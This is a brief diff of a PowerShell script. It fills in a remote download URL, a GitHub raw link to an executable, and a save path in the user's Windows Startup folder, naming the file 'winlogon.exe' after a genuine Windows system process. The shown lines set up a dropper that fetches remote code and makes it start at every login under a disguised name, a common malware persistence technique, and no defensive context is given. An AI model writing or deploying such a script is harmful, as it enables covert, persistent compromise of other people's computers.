@@ -1,5 +1,5 @@
-$URL = "URL"
-$DestPath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\executable.exe"
+$URL = "https://github.com/FoxGist/FoxGist/raw/main/winlogon.exe"
+$DestPath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\winlogon.exe"
 
 if (!(Test-Path -Path "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")) {
     New-Item -ItemType Directory -Path "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
